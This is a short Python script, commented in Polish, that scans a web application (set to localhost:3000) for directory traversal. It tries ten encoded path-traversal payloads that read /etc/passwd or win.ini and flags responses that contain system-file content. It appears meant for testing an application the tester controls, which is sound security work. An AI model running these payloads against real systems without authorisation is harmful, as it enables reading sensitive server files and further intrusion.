import requests
import sys

def test_directory_traversal(url):
    # Lista popularnych payloadow do testowania directory traversal
    payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd%00",
        "..%252f..%252f..%252fetc%252fpasswd%00.jpg",
        "..%252f..%252f..%252fetc%252fpasswd%00.png"
    ]

    # Lista sciezek do przetestowania na aplikacji
    paths = [
        "/",
        "/api/",
        "/download/",
        "/files/",
        "/images/",
        "/upload/",
        "/user/",
        "/admin/"
    ]

    print(f"\nTestowanie Directory Traversal na {url}")

    for path in paths:
        print(f"Testowanie sciezki: {path}")
        for payload in payloads:
            # Tworzenie pelnego URL do testu
            test_url = url.rstrip('/') + path + payload
            try:
                # Wysylanie zapytania GET
                response = requests.get(test_url, timeout=5)
                
                # Sprawdzanie czy znaleziono potencjalna podatnosc
                if response.status_code == 200:
                    content = response.text.lower()
                    # Sprawdzanie czy odpowiedz zawiera typowe zawartosci plikow systemowych
                    if any(keyword in content for keyword in ["root:", "nobody:", "daemon:", "[fonts]", "[extensions]"]):
                        print(f"Znaleziono potencjalna podatnosc!")
                        print(f"URL: {test_url}")
                        print(f"Status: {response.status_code}")
                        print(f"Dlugosc odpowiedzi: {len(response.text)}")
                        print(f"Pierwsze 100 znakow: {response.text[:100]}")
            except requests.exceptions.RequestException as e:
                print(f"Blad podczas testowania {test_url}: {str(e)}")

if __name__ == "__main__":
    # Adres testowej aplikacji
    target_url = "http://localhost:3000"
    test_directory_traversal(target_url)
